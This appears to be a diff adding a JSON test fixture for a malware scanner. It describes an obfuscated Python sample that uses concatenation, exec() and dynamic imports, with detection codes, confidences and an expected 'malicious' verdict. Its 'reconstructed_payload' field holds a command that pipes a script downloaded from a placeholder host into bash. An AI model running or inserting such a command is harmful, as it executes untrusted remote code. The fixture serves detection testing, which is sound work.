@@ -1,0 +1,42 @@
+{
+  "sample_id": "adv-018-string-concat",
+  "test_category": "string_manipulation_obfuscation",
+  "primary_detection": {
+    "code": "STRING-002",
+    "name": "Variable Concatenation Obfuscation",
+    "description": "Malicious code assembled through multiple variable concatenations to evade static analysis",
+    "confidence": 0.94
+  },
+  "underlying_threats": [
+    {
+      "code": "EXEC-003",
+      "name": "Dynamic Code Execution via exec()",
+      "description": "Uses exec() to execute dynamically constructed code string",
+      "confidence": 0.96
+    },
+    {
+      "code": "EXEC-004",
+      "name": "Dynamic Import Abuse",
+      "description": "Uses __import__() and getattr() to dynamically load and call dangerous functions",
+      "confidence": 0.91
+    },
+    {
+      "code": "DATA-002",
+      "name": "Remote Payload Download",
+      "description": "Downloads and executes remote backdoor script",
+      "confidence": 0.93
+    }
+  ],
+  "obfuscation_indicators": [
+    "Import statement built from 5 separate variable assignments",
+    "Module and method names constructed through concatenation",
+    "Command line built from multiple cmd_* variables",
+    "Dynamic import via __import__() with concatenated module name",
+    "Attribute access via getattr() with concatenated method name"
+  ],
+  "reconstructed_payload": "import os; os.system('curl https://[REDACTED].example.com/payload.sh | bash')",
+  "expected_verdict": "确认恶意",
+  "verdict_reasoning": "Systematic use of variable concatenation to obscure dangerous import, exec(), and remote code execution patterns",
+  "risk_level": "critical",
+  "tags": ["obfuscation", "variable-concat", "exec", "dynamic-import", "remote-code-execution"]
+}
